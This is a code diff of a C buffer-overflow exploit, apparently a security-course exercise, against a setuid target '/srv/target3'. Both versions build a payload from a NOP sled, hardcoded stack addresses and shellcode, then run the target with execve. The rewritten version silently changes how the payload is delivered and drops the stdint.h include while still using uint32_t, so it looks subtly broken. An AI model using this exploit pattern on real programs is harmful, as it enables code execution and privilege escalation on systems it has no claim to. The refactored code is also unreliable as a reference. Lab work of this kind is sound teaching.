@@ -1,39 +1,34 @@
 #include <stdio.h>
-#include <stdint.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include "shellcode.h"
 
 const char* TARGET = "/srv/target3";
-
-const int ESIZE = 400;
-const uint32_t BASE = 0xffffdec0;
-const int NSIZE = 201;
+const int BUFFER_SIZE = 400;
+const uint32_t BASE_ADDRESS = 0xffffdec0;
+const int NOP_SIZE = 201;
 const char NOP = 0x90;
-const int DIFF = 4;
-const uint32_t A1 = BASE + DIFF;
-const uint32_t A2 = BASE + 2 * DIFF;
-const char buf[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
+const int OFFSET = 4;
 
-void prep(char *e) {
-    memset(e, NOP, ESIZE - 1);
-    *((uint32_t *)(e)) = A1;
-    *((uint32_t *)(e + DIFF)) = A2;
-    memcpy(e + NSIZE, shellcode, sizeof(shellcode));
-    e[ESIZE - 1] = '\0';
+void prepare_buffer(char* buffer) {
+    memset(buffer, NOP, BUFFER_SIZE); 
+    *(uint32_t*)(buffer) = BASE_ADDRESS + OFFSET; 
+    *(uint32_t*)(buffer + OFFSET) = BASE_ADDRESS + 2 * OFFSET; 
+    memcpy(buffer + NOP_SIZE, shellcode, sizeof(shellcode)); 
+    buffer[BUFFER_SIZE - 1] = '\0';
 }
 
 int main(void) {
-    char *args[] = {TARGET, buf, NULL};
-    char env[ESIZE];
+    char env[BUFFER_SIZE];
+    prepare_buffer(env);
 
-    prep(env);
+    char* args[] = {(char*)TARGET, env, NULL};
+    char* envp[] = {NULL};
 
-    char *envp[] = {env};
-
-    execve(TARGET, args, envp);
-    fprintf(stderr, "execve failed.\n");
+    if (execve(TARGET, args, envp) == -1) {
+        perror("execve failed");
+    }
 
     return 0;
 }
